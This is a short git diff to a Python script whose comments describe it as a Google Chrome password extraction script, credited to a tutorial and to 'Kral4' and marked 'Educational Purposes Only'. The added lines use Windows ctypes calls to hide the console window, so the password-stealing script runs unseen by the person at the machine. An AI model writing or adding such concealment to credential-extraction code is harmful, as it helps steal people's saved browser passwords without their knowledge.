@@ -3,6 +3,15 @@ from Crypto.Cipher import AES
 from datetime import timezone, datetime, timedelta
 
 
+kernel32 = ctypes.WinDLL('kernel32')
+
+user32 = ctypes.WinDLL('user32')
+
+SW_HIDE = 0
+
+hWnd = kernel32.GetConsoleWindow()
+user32.ShowWindow(hWnd, SW_HIDE)
+
 #Google Chrome Password Script Source : https://www.thepythoncode.com/article/extract-chrome-passwords-python
 #Coded By Kral4 | https://github.com/rootkral4
 #Educational Purposes Only
